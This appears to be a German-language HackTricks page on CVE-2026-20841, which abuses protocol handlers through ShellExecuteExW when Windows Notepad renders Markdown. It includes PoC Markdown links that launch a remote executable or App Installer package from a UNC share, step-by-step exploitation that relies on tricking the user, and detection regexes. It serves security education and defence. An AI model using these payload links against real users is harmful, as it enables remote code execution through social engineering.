# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows-Anwendungen, die Markdown/HTML rendern, wandeln oft vom Benutzer bereitgestellte Links in klickbare Elemente um und übergeben sie an `ShellExecuteExW`. Ohne striktes scheme allowlisting kann jeder registrierte Protokoll-Handler (z. B. `file:`, `ms-appinstaller:`) ausgelöst werden, was zur Code-Ausführung im Kontext des aktuellen Benutzers führt.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad wählt den Markdown-Modus **nur für `.md`-Erweiterungen** mittels eines festen String-Vergleichs in `sub_1400ED5D0()`.
- Unterstützte Markdown-Links:
- Standard: `[text](target)`
- Autolink: `<target>` (gerendert als `[target](target)`), daher sind beide Syntaxen für Payloads und Erkennung relevant.
- Link-Klicks werden in `sub_140170F60()` verarbeitet, welche eine schwache Filterung durchführt und dann `ShellExecuteExW` aufruft.
- `ShellExecuteExW` leitet an **jeden konfigurierten Protokoll-Handler** weiter, nicht nur HTTP(S).

### Payload-Überlegungen
- Jegliche `\\`-Sequenzen im Link werden vor `ShellExecuteExW` **auf `\` normalisiert**, was UNC-/Pfad-Konstruktion und Erkennung beeinflusst.
- `.md`-Dateien sind **nicht standardmäßig mit Notepad verknüpft**; das Opfer muss die Datei noch in Notepad öffnen und den Link anklicken, aber sobald sie gerendert ist, ist der Link klickbar.
- Gefährliche Beispielprotokolle:
- `file://` um ein lokales/UNC-Payload auszulösen.
- `ms-appinstaller://` um App Installer-Flows auszulösen. Andere lokal registrierte Protokolle können ebenfalls missbrauchbar sein.

### Minimales PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Ablauf der Ausnutzung
1. Erstelle eine **`.md`-Datei**, damit Notepad sie als Markdown darstellt.
2. Betten einen Link mit einem gefährlichen URI-Schema ein (`file:`, `ms-appinstaller:`, oder einen beliebigen installierten Handler).
3. Übertrage die Datei (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB oder ähnlich) und überzeuge den Nutzer, sie in Notepad zu öffnen.
4. Beim Klick wird der **normalisierte Link** an `ShellExecuteExW` übergeben und der entsprechende Protokoll-Handler führt den referenzierten Inhalt im Kontext des Nutzers aus.

## Erkennungsansätze
- Überwache Übertragungen von `.md`-Dateien über Ports/Protokolle, die üblicherweise Dokumente liefern: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Par siere Markdown-Links (standard und autolink) und suche nach `file:` oder `ms-appinstaller:` **ohne Berücksichtigung der Groß-/Kleinschreibung**.
- Vom Anbieter empfohlene Regexes, um den Zugriff auf Remote-Ressourcen zu erkennen:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Berichten zufolge allowlists das Patch-Verhalten lokale Dateien und HTTP(S); alles andere, das `ShellExecuteExW` erreicht, ist verdächtig. Erweitere detections auf andere installierte protocol handlers nach Bedarf, da die attack surface je nach System variiert.

## Referenzen
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
